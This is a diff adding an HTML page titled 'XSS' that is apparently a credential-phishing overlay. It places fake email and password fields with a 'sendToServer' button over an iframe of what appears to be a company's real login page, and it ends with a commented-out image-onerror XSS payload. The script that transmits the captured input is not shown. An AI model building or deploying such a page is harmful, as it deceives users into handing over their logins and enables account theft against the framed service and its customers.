@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="styles.css" /> 
+    <title>XSS</title>
+</head>
+<body>
+    <input id="fakeEmail" type="email" placeholder="Correo"></input>
+    <input id="fakePassword" type="password" placeholder="Contraseña"></input>
+    <button onclick="sendToServer()"> Ingresar</button>
+    <div>
+        <iframe
+            src="https://companyname.riqra.com/ingresar"
+            height="800px"
+            width="100%"
+            scrolling="no"
+        >
+        </iframe>
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
+
+<!-- <img src onerror='alert("djfjdjf")'> -->
